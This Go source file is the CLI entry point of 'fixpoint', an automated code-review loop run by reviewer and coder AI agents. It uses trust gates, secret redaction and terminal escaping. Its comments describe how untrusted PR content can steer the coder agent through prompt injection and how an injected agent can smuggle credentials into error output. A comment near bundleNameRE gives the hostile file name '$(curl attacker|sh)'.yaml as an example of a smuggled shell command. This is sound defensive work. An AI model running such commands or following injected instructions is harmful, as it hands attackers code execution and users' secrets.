// fixpoint orchestrates an automated code-review cycle: reviewer agents
// report findings, a coder agent validates and fixes them, and the loop
// repeats until reviews come back clean. See fixpoint.yaml.
package main

import (
	"context"
	"errors"
	"flag"
	"fmt"
	"io"
	"os"
	"os/signal"
	"path/filepath"
	"regexp"
	"sort"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/dsaiko/fixpoint/internal/agent"
	"github.com/dsaiko/fixpoint/internal/config"
	"github.com/dsaiko/fixpoint/internal/logstore"
	"github.com/dsaiko/fixpoint/internal/model"
	"github.com/dsaiko/fixpoint/internal/orchestrator"
)

func main() {
	os.Exit(run(os.Args[1:], os.Stdout, os.Stderr))
}

// run executes the CLI and returns the process exit status: 0 on success,
// 2 when the loop hit max_iterations without converging (and on usage
// errors, matching flag's convention), 1 for every failure or interruption.
// stdout carries requested output (--list); stderr carries the run log. Keeping
// them separate is what lets `fixpoint --list | grep` and shell completion work.
func run(args []string, stdout, stderr io.Writer) int {
	fs := flag.NewFlagSet("fixpoint", flag.ContinueOnError)
	fs.SetOutput(stderr)
	fs.Usage = func() {
		fmt.Fprintf(stderr, `fixpoint - automated code-review loop

Usage:
  fixpoint <config> [flags]     run a named config from the bundle search path
  fixpoint ./some.yaml [flags]  run a config by path
  fixpoint --list               list the configs available here
  fixpoint completion <shell>   print a completion script (bash | zsh | fish)

Flags:
`)
		fs.PrintDefaults()
	}
	cfgPath := fs.String("config", "", "path to a config file (alternative to the positional name)")
	reviewOnly := fs.Bool("review-only", false, "run exactly one review round; never invoke the coder")
	maxIter := fs.Int("max-iterations", 0, "override loop.max_iterations (0 = use config)")
	baseRef := fs.String("base-ref", "", "override target.base_ref in git-diff mode; a trailing \"...\" means the merge base with HEAD (empty = use config)")
	allowUntrustedFix := fs.Bool("allow-untrusted-fix", false, "permit fix rounds in pr mode; PR content is untrusted and can steer the coder via prompt injection")
	trustedTarget := fs.Bool("trusted-target", false, "assert the directory/git-diff target holds only trusted code, permitting fix rounds (fail-closed without this)")
	list := fs.Bool("list", false, "list the task configs on the search path with where each resolved from, and exit")
	porcelain := fs.Bool("porcelain", false, "with --list, emit a stable tab-separated form for scripts and shell completion")
	check := fs.Bool("check", false, "validate the configuration and exit without running")
	checkLive := fs.Bool("check-live", false, "validate the configuration, ping every agent, and exit without running")
	positionals, err := parseArgs(fs, args)
	if err != nil {
		return 2
	}

	logf, logRaw := newRunLogger(stderr)

	// Anchor the run at the project root -- the git root, or the nearest directory
	// holding a config bundle, found by walking up from the working directory. Every
	// relative path in the configuration resolves against it, so the same command
	// reviews the whole project whether it is run from the root or three
	// directories down.
	cwd, err := os.Getwd()
	if err != nil {
		logf("working directory: %v", err)
		return 1
	}
	projectRoot, err := config.ProjectRoot(cwd)
	if err != nil {
		logf("project root: %v", err)
		return 1
	}
	resolver := config.NewResolver(projectRoot)

	// Modes that print something and exit, before any config is resolved.
	if code, handled := earlyExit(resolver, projectRoot, positionals, *list, *porcelain, stdout, stderr); handled {
		return code
	}

	name, err := configName(positionals, *cfgPath)
	if err != nil {
		logf("%v", err)
		fs.Usage()
		return 2
	}

	// Compile the effective configuration in one step: the flags are folded in by
	// LoadBundle, because an override changes what a valid configuration is (e.g.
	// -review-only exempts an all-once lens list from the recurring-lens rule) and
	// validation must therefore see the post-override value.
	loaded, err := config.LoadBundle(resolver, name, projectRoot, config.Overrides{
		ReviewOnly:        *reviewOnly,
		MaxIterations:     *maxIter,
		BaseRef:           *baseRef,
		AllowUntrustedFix: *allowUntrustedFix,
		TrustedTarget:     *trustedTarget,
	})
	if err != nil {
		logf("config: %v", err)
		return 1
	}
	cfg := loaded.Config
	logSource(logf, loaded)
	if !allowProjectSuppliedPolicy(loaded, logf) {
		return 1
	}

	if err := loaded.Validate(); err != nil {
		logf("config: %v", err)
		return 1
	}

	o, err := orchestrator.New(loaded, logf)
	if err != nil {
		logf("startup validation: %v", err)
		return 1
	}
	if *check {
		logf("configuration OK: %d review lens(es), coder %s, strategy %s",
			len(cfg.Roles.Review.Prompts), cfg.Roles.Coder.Agent, cfg.Roles.Review.Strategy)
		return 0
	}

	ctx, stop := installSignals(logf)
	defer stop()

	if *checkLive {
		logf("static validation OK; pinging agents...")
		if err := o.Ping(ctx); err != nil {
			logf("check-live: %v", err)
			return 1
		}
		logf("check-live OK: all agents responding")
		return 0
	}

	sum, err := o.Run(ctx)
	// Tear the handler down the instant the run is over, not at return. Everything
	// below is output; there is no step left to stop and no tree left to reconcile,
	// so an interrupt arriving here is not an in-run pause -- and with the watch
	// still live, the first would announce a pause that never happens and a second
	// would force-quit a run that already succeeded. The deferred stop() above stays
	// as the backstop for the early-return paths; stop is idempotent.
	stop()

	// The scoreboard prints even when the run failed: a partial run still spent
	// tokens and may have committed rounds, and that is exactly when the operator
	// needs to see what landed. It goes through logRaw rather than logf, which
	// stamps every line with a timestamp and would shred the column alignment --
	// but still under logMu, so no concurrent log line can split the table.
	if sum != nil {
		logRaw("\n" + agent.RedactSecrets(logstore.RenderRunTable(sum)))
	}
	if err != nil {
		logf("run failed: %v", err)
		return 1
	}
	// Keep the one-line, timestamped, greppable outcome as well as the table: the
	// table is for a human reading the tail, this is what a log scraper matches.
	// The closing round is counted separately -- it runs after the outcome is
	// decided, so folding it in would overstate how long convergence took.
	loopRounds, closing := 0, 0
	for _, r := range sum.Rounds {
		if r.Final {
			closing++
		} else {
			loopRounds++
		}
	}
	done := fmt.Sprintf("done: %s after %d round(s)", sum.Termination, loopRounds)
	if closing > 0 {
		done += " + closing round"
	}
	logf("%s", done)
	if sum.Termination == model.TermAllRejected {
		// Exit 3, NOT 0. "The coder rejected every finding" is not "the code is
		// clean" -- it could equally mean the reviewers are miscalibrated or the
		// coder was unwilling. Nothing changed, so automation keying on exit 0 would
		// read a no-op as a converged run.
		logf("no changes were made: the coder rejected every finding this round")
	}
	return model.ExitCode(sum.Termination)
}

// newRunLogger is the constructor run() uses for its writers. It is a variable
// so a test can wrap them: the table's own writer is what lets a full-CLI test
// drive a concurrent log line into the window the scoreboard write holds open,
// and going through it is what pins the scoreboard to the locked path at all --
// a table written straight to stderr would never reach the wrapper.
var newRunLogger = newLogger

// newLogger builds the run's two stderr writers over ONE mutex: logf for the
// timestamped single lines everything logs, and logRaw for pre-formatted
// multi-line output. It is a function rather than two closures inside run() so
// a test can drive both against a writer of its own and pin the shared lock --
// the interleaving it prevents needs a concurrent writer, which a normal run
// only has in a window (the end-of-run table racing the signal handler) that a
// full-CLI test cannot open on demand.
func newLogger(stderr io.Writer) (logf func(string, ...any), logRaw func(string)) {
	var logMu sync.Mutex // reviewer goroutines log concurrently
	logf = func(format string, args ...any) {
		logMu.Lock()
		defer logMu.Unlock()
		// Redact before writing: reviewer/coder/git errors flow through here
		// verbatim, and a prompt-injected agent can smuggle a credential into one
		// (e.g. inside an invalid severity that validateReviewFindings echoes back).
		// Persisted logs already mask these; stderr and CI console logs must too.
		//
		// Then escape, so every line is display-only. The same target-controlled text
		// reaches here as reaches the listing: agent/prompt names and the bundle paths
		// they resolved to (logSource), the ProjectSuppliedPolicy listing the operator
		// reads before asserting -trusted-target, and git/agent output quoted into an
		// error. Escaping last means the redaction mask itself is never split by an
		// escape, and that a name embedding ESC/CSI cannot scroll the other entries of
		// a refusal off the screen and get trust asserted on a listing it drew.
		msg := agent.EscapeTerminal(agent.RedactSecrets(fmt.Sprintf(format, args...)))
		fmt.Fprintf(stderr, "%s %s\n", time.Now().Format("15:04:05"), msg)
	}
	// logRaw writes pre-formatted, multi-line output under the same lock as logf,
	// so a heartbeat or signal-handler line cannot land mid-table and shred the
	// column alignment. Callers own redaction/escaping for what they pass.
	logRaw = func(s string) {
		logMu.Lock()
		defer logMu.Unlock()
		fmt.Fprint(stderr, s)
	}
	return logf, logRaw
}

// forceQuit ends the process on a second interrupt, with the interrupted run's
// exit status. It is a variable so the second-signal path can be tested at all:
// an in-process os.Exit would take the test binary with it.
var forceQuit = func() { os.Exit(1) }

// installSignals is the constructor run() uses for its interrupt handler. It is a
// variable for the same reason newRunLogger is: whether the handler is still
// installed while the end-of-run output prints is not observable from outside the
// process -- the stdlib exposes no way to ask whether a signal has a handler, and
// sending a real one to find out kills the test binary on exactly the path that
// should pass -- so a test wraps this to watch stop() land before the scoreboard.
var installSignals = notifySignals

// notifySignals returns a context canceled by the first SIGINT/SIGTERM, and
// keeps a SECOND one fatal. It replaces signal.NotifyContext, whose relay
// goroutine cancels once and then RETURNS while its signal.Notify registration
// stays installed: Go's default die-on-SIGINT behavior is disabled for the rest
// of the process, so every later Ctrl-C -- and SIGTERM, so plain `kill` too -- is
// buffered and dropped, leaving only SIGKILL.
//
// That matters precisely in the window the first signal opens. Interruption
// reconciliation deliberately runs on a FRESH context (the run's is canceled) and
// is bounded only per git operation, several operations deep; on a large
// repository, or if one of them wedges, the operator has asked to stop and must
// still be able to ask again. The returned stop func unregisters the handler and
// releases the goroutine; it is idempotent, so the caller can tear the handler
// down as soon as the run is over and still defer it as a backstop.
func notifySignals(logf func(string, ...any)) (context.Context, func()) {
	ctx, cancel := context.WithCancel(context.Background())
	// Buffered: signal delivery never blocks, and a second signal arriving while
	// the first is being handled must not be dropped.
	ch := make(chan os.Signal, 2)
	signal.Notify(ch, os.Interrupt, syscall.SIGTERM)
	done := make(chan struct{})
	stopped := make(chan struct{})
	go func() {
		defer close(stopped)
		watchSignals(ch, done, logf, cancel)
	}()
	// once, so the caller can both tear down at the end of the run and defer the
	// same func: a second close(done) would panic.
	var once sync.Once
	return ctx, func() {
		once.Do(func() {
			// The order is the whole point: stop delivery, release the goroutine, and wait
			// for it to acknowledge before canceling. Canceling while the goroutine can
			// still run leaves it racing the caller's normal exit -- with nothing to join
			// on, a queued signal could force-quit the process out from under a run that
			// had already succeeded.
			signal.Stop(ch)
			close(done)
			<-stopped
			cancel()
		})
	}
}

// watchSignals runs the interrupt state machine until done is closed: the first
// signal announces the pause and cancels the run, a second quits outright, and a
// signal still queued when teardown starts is discarded. It is a separate
// function so a test can own both channels and pin the exact interleaving the
// tie-break below exists for -- driving it through real process signals can only
// hope to land in that window, and silently passes when it misses.
func watchSignals(ch <-chan os.Signal, done <-chan struct{}, logf func(string, ...any), cancel context.CancelFunc) {
	// Count the interrupts here rather than reading them back off ctx.Err(): the
	// stop func cancels that same context, so a canceled ctx cannot tell "the
	// operator asked twice" apart from "the run finished and tore the handler
	// down", and mistaking the latter for a second interrupt would force-quit a
	// successful run with exit 1.
	handled := 0
	for {
		select {
		case <-done:
			return
		case <-ch:
			// Teardown wins a tie. When a signal lands just as the run returns both
			// channels are ready and select picks at random; the run is already over,
			// so acting on that signal would either announce a pause that never
			// happens or quit on what is really the first interrupt.
			select {
			case <-done:
				return
			default:
			}
			handled++
			if handled == 1 {
				// Name what the pause is: the run does not stop the instant the signal
				// lands, it stops the current step and then reconciles the tree.
				logf("interrupted: stopping after the current step, then stashing any edits so the tree is left clean -- interrupt again to quit immediately")
				cancel()
				continue
			}
			logf("interrupted again: quitting now; the working tree may be left dirty (check `git status` and `git stash list`)")
			forceQuit()
		}
	}
}

// configName picks the config to run from the positional argument or -config.
// Both together is an error rather than a silent precedence rule: which one won
// decides what gets reviewed and whether fixes are permitted, so a caller must
// not have to guess.
func configName(names []string, flagPath string) (string, error) {
	switch {
	case len(names) > 1:
		return "", fmt.Errorf("expected one config name, got %d: %v", len(names), names)
	case len(names) == 1 && flagPath != "":
		return "", fmt.Errorf("both a config name (%s) and -config (%s) were given; pass one", names[0], flagPath)
	case len(names) == 1:
		return names[0], nil
	case flagPath != "":
		return flagPath, nil
	default:
		return "", errors.New("no config given; run `fixpoint --list` to see what is available")
	}
}

// logSource reports where every file the run is built from was resolved. These
// files decide what agents are told to do and which trust gates apply, so a run
// that says only "loaded fix-code" hides the thing most worth knowing: whether
// a project-local prompt shadowed the installed one.
func logSource(logf func(string, ...any), l *config.Loaded) {
	logf("project root: %s", l.ProjectRoot)
	logf("config: %s", l.Source.Config)
	if l.Source.Extends != "" {
		logf("  extends: %s", l.Source.Extends)
	}
	for _, name := range sortedKeys(l.Source.Agents) {
		logf("  agent %s: %s", name, l.Source.Agents[name])
	}
	for _, name := range sortedKeys(l.Source.Prompts) {
		logf("  prompt %s: %s", name, l.Source.Prompts[name])
	}
	// The files above no longer explain the effective run on their own: a flag can
	// enable fix rounds on a config that does not ask for them. Record the
	// assertions beside their provenance, so reading a run back answers "why was
	// this permitted?" and not just "which config was it?".
	if applied := l.Overrides.Applied(); len(applied) > 0 {
		logf("  overridden by flags: %s", strings.Join(applied, ", "))
	}
}

func sortedKeys(m map[string]string) []string {
	out := make([]string, 0, len(m))
	for k := range m {
		out = append(out, k)
	}
	sort.Strings(out)
	return out
}

// listConfigs prints the runnable configs and the search path, which is both the
// discovery mechanism for a human and what shell completion consumes.
func listConfigs(r *config.Resolver, projectRoot string, stdout, stderr io.Writer) int {
	configs, err := r.ListConfigs()
	if err != nil {
		fmt.Fprintf(stderr, "listing configs: %v\n", err)
		return 1
	}
	if len(configs) == 0 {
		// A failure, so it belongs on stderr: nothing is runnable here.
		fmt.Fprintf(stderr, "No configs found. Searched:\n")
		for _, b := range r.Bundles {
			fmt.Fprintf(stderr, "  %s\n", b)
		}
		fmt.Fprintf(stderr, "Install the fixpoint config bundle, or copy one into %s.\n",
			filepath.Join(projectRoot, "config"))
		return 1
	}
	for _, c := range configs {
		// Base configs are listed, not hidden: you need to know one exists to write
		// `extends: defaults`. But they are marked, because an unmarked listing reads
		// as "things you can run" and inviting someone to run a base is a wasted
		// round trip through a validation error.
		//
		// Name, description, and path all come from a bundle directory -- the first
		// one searched is <project>/config, inside the repository under review -- so
		// every one is escaped before it reaches the operator's terminal. Listing is
		// how you find out what a repository offers, and it runs before any trust
		// gate, so merely looking must not let the repository drive the terminal.
		desc := sanitizeField(c.Description)
		if !c.Runnable {
			desc = strings.TrimSpace(desc + "  (base — for `extends`, not runnable)")
		}
		fmt.Fprintf(stdout, "%-14s %s\n", escapeTerminal(c.Name), desc)
		fmt.Fprintf(stdout, "%-14s %s\n", "", escapeTerminal(c.Path))
	}
	return 0
}

// listPorcelain writes the machine-readable listing that shell completion parses:
// one config per line, tab-separated name, runnability, and description.
//
// Completion queries the binary rather than baking the config list into the
// generated script, so adding a config to a bundle takes effect immediately -- a
// script with names hardcoded at generation time would quietly go stale.
func listPorcelain(r *config.Resolver, stdout, stderr io.Writer) int {
	configs, err := r.ListConfigs()
	if err != nil {
		fmt.Fprintf(stderr, "listing configs: %v\n", err)
		return 1
	}
	for _, c := range configs {
		if !bundleNameRE.MatchString(c.Name) {
			// Dropped, not mangled: a name that cannot be passed through safely is not
			// one a caller could run either. Reported on stderr (quoted, so a control
			// character cannot rewrite the operator's terminal) so a config vanishing
			// from completion is explained rather than mysterious.
			fmt.Fprintf(stderr, "skipping %q: a config name must be a bare identifier (letters, digits, dot, dash, underscore)\n", c.Path)
			continue
		}
		state := "base"
		if c.Runnable {
			state = "runnable"
		}
		// Tabs and newlines would break the format, and a description is
		// operator-authored text that could contain either.
		fmt.Fprintf(stdout, "%s\t%s\t%s\n", c.Name, state, sanitizeField(c.Description))
	}
	return 0
}

// bundleNameRE is the documented shape of a bundle name: a bare identifier.
//
// Enforced on OUTPUT because a name is a FILENAME from a bundle directory, and the
// first directory searched is <project>/config -- inside the repository under
// review. That makes every name untrusted input that reaches a shell: completion
// scripts consume this listing, and an installed script is generated once and never
// regenerated, so the binary must not hand it a name it cannot quote. A repository
// shipping config/'$(curl attacker|sh)'.yaml gets nothing past this point.
var bundleNameRE = regexp.MustCompile(`^[A-Za-z0-9._-]+$`)

// sanitizeField flattens a value so it cannot break the tab-separated format,
// then escapes what a terminal would interpret rather than print.
func sanitizeField(s string) string {
	return escapeTerminal(strings.Join(strings.Fields(strings.ReplaceAll(s, "\t", " ")), " "))
}

// escapeTerminal renders repository-controlled text as something a terminal only
// DISPLAYS -- see agent.EscapeTerminal for what it escapes and why. A
// description is free text from a YAML file in the repository under review (the
// project bundle is searched first, so it shadows the installed one), and both
// consumers print it before any trust gate applies: `fixpoint --list` writes it
// to the operator's terminal, and the porcelain form is what zsh/fish show as the
// completion description when TAB is pressed.
func escapeTerminal(s string) string { return agent.EscapeTerminal(s) }

// allowProjectSuppliedPolicy gates bundle files that were resolved from inside the
// project under review. Those are policy, not data: an agent command (from its own
// file or inline in the task config) and a verify command are argv fixpoint runs,
// and a prompt is the instruction stream it hands an agent that can read anything
// the invoking user can. None of that needs a model's cooperation or a prompt
// injection to exploit, so it requires the same explicit trust assertion as letting
// the coder edit that repository.
func allowProjectSuppliedPolicy(l *config.Loaded, logf func(string, ...any)) bool {
	supplied := l.ProjectSuppliedPolicy()
	if len(supplied) == 0 || l.Config.Loop.TrustedTarget {
		return true
	}
	logf("refusing to run: the run is built from files inside the target, which supply the commands fixpoint executes and the instructions it sends to agents:")
	for _, s := range supplied {
		logf("  %s", s)
	}
	logf("Read those files, then pass -trusted-target to assert the target is trusted -- or point -config at a bundle outside it.")
	return false
}

// parseArgs parses flags that may appear BEFORE or AFTER the positional config
// name, collecting the positionals. Go's flag package stops at the first non-flag
// argument, so `fixpoint --check fix-code --trusted-target` would otherwise
// silently drop the trailing flag -- and that flag is the gate permitting file
// edits, which makes losing it the worst possible parse failure. Looping over
// Parse consumes each positional and resumes flag parsing after it, so every
// argument order behaves the same, and a flag's own value can never be mistaken
// for the config name because Parse has already consumed it.
func parseArgs(fs *flag.FlagSet, args []string) ([]string, error) {
	var positionals []string
	for {
		if err := fs.Parse(args); err != nil {
			return nil, err
		}
		rest := fs.Args()
		if len(rest) == 0 {
			return positionals, nil
		}
		positionals = append(positionals, rest[0])
		args = rest[1:]
	}
}

// earlyExit handles the modes that print and exit without resolving a config:
// listing, its machine-readable form, and the completion subcommand. Split out of
// run so the run path itself stays a readable sequence.
//
// `completion` is intercepted here because the argument parser treats bare words
// as the config to run, so it would otherwise be looked up as a config name.
func earlyExit(r *config.Resolver, projectRoot string, positionals []string, list, porcelain bool, stdout, stderr io.Writer) (int, bool) {
	if len(positionals) > 0 && positionals[0] == "completion" {
		return writeCompletion(positionals[1:], stdout, stderr), true
	}
	if list {
		if porcelain {
			return listPorcelain(r, stdout, stderr), true
		}
		return listConfigs(r, projectRoot, stdout, stderr), true
	}
	return 0, false
}
